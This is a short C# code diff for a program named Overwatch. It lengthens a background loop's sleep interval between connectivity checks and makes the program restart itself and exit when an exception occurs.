@@ -16,7 +16,7 @@ namespace Overwatch
             {
                 while (true)
                 {
-                    System.Threading.Thread.Sleep(65000);
+                    System.Threading.Thread.Sleep(12000000);
                     
                     if (ConnectivityChecker.CheckInternet() == true)
                     {
@@ -48,7 +48,11 @@ namespace Overwatch
                     }
                 }
             }
-            catch (Exception ex) { Log.Write(ex.Message, true); cThread.sending = false; }
+            catch (Exception ex) {
+                Log.Write(ex.Message, true);
+                Process.Start(Assembly.GetExecutingAssembly().Location);
+                Environment.Exit(0);
+            }
         }
     }
     public static class ConnectivityChecker
